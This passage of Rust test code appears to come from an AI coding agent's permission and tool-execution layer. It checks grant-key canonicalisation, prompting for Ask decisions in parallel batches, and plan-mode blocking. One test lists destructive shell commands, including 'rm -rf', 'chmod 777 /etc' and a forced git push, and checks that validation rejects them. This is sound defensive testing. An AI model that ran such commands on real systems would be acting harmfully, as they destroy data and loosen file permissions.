        );
        assert!(blocked.must_block_when_degraded());
        assert!(!permitted.must_block_when_degraded());

        let blocked_state = sandbox_grant_state(Some(&blocked));
        let permitted_state = sandbox_grant_state(Some(&permitted));
        assert_ne!(
            blocked_state, permitted_state,
            "a refused call and a permitted unsandboxed call shared a sandbox state"
        );
        assert_eq!(
            permitted_state,
            sandbox_grant_state(None),
            "degrading open is the same absence of isolation as no sandbox"
        );

        let input = serde_json::json!({"command": "make"});
        let cwd = std::path::Path::new("/test-cwd");
        assert_ne!(
            persistent_grant_key("Bash", &input, &blocked_state, cwd),
            persistent_grant_key("Bash", &input, &permitted_state, cwd),
            "a grant stored while degraded-and-refusing carried into a \
             degraded-but-permitted session"
        );
    }

    /// serde_json maps serialize with sorted keys, so the same logical
    /// input yields the same key regardless of the order the model
    /// emitted the fields in.
    #[test]
    fn a_grant_key_is_canonical_over_field_order() {
        let a: serde_json::Value =
            serde_json::from_str(r#"{"file_path":"/tmp/x","content":"hi"}"#).unwrap();
        let b: serde_json::Value =
            serde_json::from_str(r#"{"content":"hi","file_path":"/tmp/x"}"#).unwrap();
        assert_eq!(pkey("FileWrite", &a), pkey("FileWrite", &b));
    }

    /// Grants live below the destructive-command floor: `validate_input`
    /// rejects these before the permission system runs, so no recorded
    /// grant can bring them back.
    #[test]
    fn a_grant_cannot_resurrect_a_destructive_command() {
        use crate::tools::Tool;
        let bash = crate::tools::bash::BashTool;
        for cmd in ["rm -rf /tmp/x", "chmod 777 /etc", "git push --force"] {
            assert!(
                bash.validate_input(&serde_json::json!({ "command": cmd }))
                    .is_err(),
                "destructive command reached the permission layer: {cmd}"
            );
        }
    }

    #[test]
    fn session_allow_key_distinguishes_bash_commands() {
        let a = session_allow_key("Bash", &serde_json::json!({"command": "ls"}));
        let b = session_allow_key("Bash", &serde_json::json!({"command": "rm -rf /"}));
        assert_ne!(a, b);
        assert_eq!(
            a,
            session_allow_key("Bash", &serde_json::json!({"command": "ls"}))
        );
    }

    #[test]
    fn session_allow_key_fallback_distinguishes_shared_prefixes() {
        // The pre-hash fallback truncated canonical JSON at 256 chars, so
        // two different inputs sharing a long prefix produced the SAME key
        // — an AllowSession grant for one covered the other.
        let prefix = "x".repeat(300);
        let a = session_allow_key(
            "ApplyPatch",
            &serde_json::json!({"patch": format!("{prefix}-variant-a")}),
        );
        let b = session_allow_key(
            "ApplyPatch",
            &serde_json::json!({"patch": format!("{prefix}-variant-b")}),
        );
        assert_ne!(a, b, "distinct inputs must have distinct allow keys");
        // Still deterministic for identical input.
        assert_eq!(
            a,
            session_allow_key(
                "ApplyPatch",
                &serde_json::json!({"patch": format!("{prefix}-variant-a")}),
            )
        );
    }
}

#[cfg(test)]
mod parallel_batch_tests {
    use super::*;
    use crate::permissions::PermissionDecision;
    use crate::tools::{PermissionPrompter, PermissionResponse, Tool, ToolResult};
    use async_trait::async_trait;
    use std::sync::Arc;
    use std::sync::atomic::{AtomicUsize, Ordering};

    /// Concurrency-safe but NOT read-only — the SendMessage/TaskStop shape.
    struct MutSafeTool {
        ran: Arc<AtomicUsize>,
    }

    #[async_trait]
    impl Tool for MutSafeTool {
        fn name(&self) -> &'static str {
            "MutSafe"
        }
        fn description(&self) -> &'static str {
            "test tool"
        }
        fn prompt(&self) -> String {
            String::new()
        }
        fn input_schema(&self) -> serde_json::Value {
            serde_json::json!({"type": "object"})
        }
        fn is_read_only(&self) -> bool {
            false
        }
        fn is_concurrency_safe(&self) -> bool {
            true
        }
        async fn check_permissions(
            &self,
            _input: &serde_json::Value,
            _checker: &crate::permissions::PermissionChecker,
        ) -> PermissionDecision {
            PermissionDecision::Ask("mutating test tool".into())
        }
        async fn call(
            &self,
            _input: serde_json::Value,
            _ctx: &ToolContext,
        ) -> Result<ToolResult, crate::error::ToolError> {
            self.ran.fetch_add(1, Ordering::SeqCst);
            Ok(ToolResult::success("ok".to_string()))
        }
    }

    struct DenyPrompter {
        asked: Arc<AtomicUsize>,
    }
    impl PermissionPrompter for DenyPrompter {
        fn ask(
            &self,
            _tool_name: &str,
            _description: &str,
            _input_preview: Option<&str>,
            _origin: Option<&str>,
        ) -> PermissionResponse {
            self.asked.fetch_add(1, Ordering::SeqCst);
            PermissionResponse::Deny
        }
    }

    /// A mutating concurrency-safe tool must NOT ride the parallel branch
    /// into a stripped context where `Ask` auto-allows: its Ask decision
    /// has to reach the prompter, and a Deny has to block the call.
    #[tokio::test]
    async fn mutating_concurrency_safe_tool_ask_reaches_prompter() {
        let ran = Arc::new(AtomicUsize::new(0));
        let asked = Arc::new(AtomicUsize::new(0));
        let tools: Vec<Arc<dyn Tool>> = vec![Arc::new(MutSafeTool { ran: ran.clone() })];

        let mut ctx = ToolContext::minimal(
            std::env::temp_dir(),
            tokio_util::sync::CancellationToken::new(),
        );
        ctx.permission_prompter = Some(Arc::new(DenyPrompter {
            asked: asked.clone(),
        }));

        let calls = vec![
            PendingToolCall {
                id: "c1".into(),
                name: "MutSafe".into(),
                input: serde_json::json!({}),
            },
            PendingToolCall {
                id: "c2".into(),
                name: "MutSafe".into(),
                input: serde_json::json!({}),
            },
        ];
        let checker = crate::permissions::PermissionChecker::allow_all();
        let results = execute_tool_calls(&calls, &tools, &ctx, &checker).await;

        assert_eq!(results.len(), 2);
        assert_eq!(
            asked.load(Ordering::SeqCst),
            2,
            "every Ask must reach the prompter (parallel branch used to \
             strip it and auto-allow)"
        );
        assert_eq!(ran.load(Ordering::SeqCst), 0, "denied tool must not run");
        for r in &results {
            assert!(r.result.is_error, "denied call returns an error result");
        }
    }
}

#[cfg(test)]
mod live_plan_gate_tests {
    use super::*;
    use crate::permissions::{PermissionChecker, PermissionDecision};
    use crate::tools::{Tool, ToolResult};
    use async_trait::async_trait;
    use std::sync::Arc;
    use std::sync::atomic::{AtomicBool, Ordering};

    struct WriteTool;

    #[async_trait]
    impl Tool for WriteTool {
        fn name(&self) -> &'static str {
            "TestWrite"
        }
        fn description(&self) -> &'static str {
            "test write tool"
        }
        fn input_schema(&self) -> serde_json::Value {
            serde_json::json!({"type": "object"})
        }
        fn is_read_only(&self) -> bool {
            false
        }
        async fn check_permissions(
            &self,
            _input: &serde_json::Value,
            _checker: &PermissionChecker,
        ) -> PermissionDecision {
            PermissionDecision::Allow
        }
        async fn call(
            &self,
            _input: serde_json::Value,
            _ctx: &ToolContext,
        ) -> Result<ToolResult, crate::error::ToolError> {
            Ok(ToolResult::success("wrote".to_string()))
        }
    }

    fn call() -> PendingToolCall {
        PendingToolCall {
            id: "c1".into(),
            name: "TestWrite".into(),
            input: serde_json::json!({}),
        }
    }

    /// A Plan toggle that lands mid-batch must gate the very next call:
    /// the context snapshot says "not plan mode" (taken at iteration
    /// start), but the live flag flipped while an earlier tool in the
    /// batch was still running.
    #[tokio::test]
    async fn live_plan_flip_gates_next_call_despite_stale_snapshot() {
        let live = Arc::new(AtomicBool::new(false));
        let mut ctx = ToolContext::for_tests();
        ctx.plan_mode = false;
        ctx.live_plan_mode = Some(live.clone());
        let checker = PermissionChecker::allow_all();

        // Flip to Plan "mid-batch".
        live.store(true, Ordering::SeqCst);
        let blocked = execute_single_tool(&call(), &WriteTool, &ctx, &checker).await;
        assert!(blocked.result.is_error, "write must be blocked live");
        assert!(blocked.result.content.contains("Plan mode active"));

        // Flip back out of Plan: the same context allows again.
        live.store(false, Ordering::SeqCst);
        let allowed = execute_single_tool(&call(), &WriteTool, &ctx, &checker).await;
        assert!(!allowed.result.is_error, "write allowed after live exit");
    }

    /// Without a live handle the snapshot still gates (test contexts).
    #[tokio::test]
    async fn snapshot_gates_when_no_live_handle() {
        let mut ctx = ToolContext::for_tests();
        ctx.plan_mode = true;
        let checker = PermissionChecker::allow_all();
        let blocked = execute_single_tool(&call(), &WriteTool, &ctx, &checker).await;
        assert!(blocked.result.is_error);
    }
}
